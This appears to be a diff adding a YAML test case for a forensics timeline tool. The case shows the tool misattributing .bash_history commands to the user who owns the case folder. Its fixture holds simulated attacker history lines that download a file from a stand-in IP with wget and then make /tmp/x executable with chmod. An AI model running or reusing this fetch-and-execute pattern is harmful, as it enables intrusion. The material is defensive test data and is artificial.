@@ -1,0 +1,29 @@
+# Matrix case P4107-006: build_timeline takes the bash actor from the first
+# "home" path segment of the absolute path, so a case stored under
+# /.../home/<name>/ gives every bash event that name.
+case_id: P4107-006
+problem: P4107
+server: findevil
+variant: findevil-d1a8d25
+commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
+display: response
+level: mcp
+realism: possible
+coverage: full
+summary: When the case folder sits under home/analyst/, commands from fs/home/alice/.bash_history and fs/root/.bash_history are both attributed to "analyst", and provenance only says ".bash_history:N", so the real owner cannot be recovered.
+fixture:
+  - path: home/analyst/case/fs/home/alice/.bash_history
+    text: "#1775971800\nwget http://203.0.113.7/x\n"
+  - path: home/analyst/case/fs/root/.bash_history
+    text: "#1775972100\nchmod +x /tmp/x\n"
+steps:
+  - tool: build_timeline
+    args:
+      evidence_root: ${EVIDENCE}/home/analyst/case
+expect:
+  - step: 1
+    regex: "\\| bash_history \\| `analyst` \\| shell_command \\| wget"
+  - step: 1
+    regex: "\\| bash_history \\| `analyst` \\| shell_command \\| chmod"
+  - step: 1
+    not_regex: "`(alice|root)` \\| shell_command"
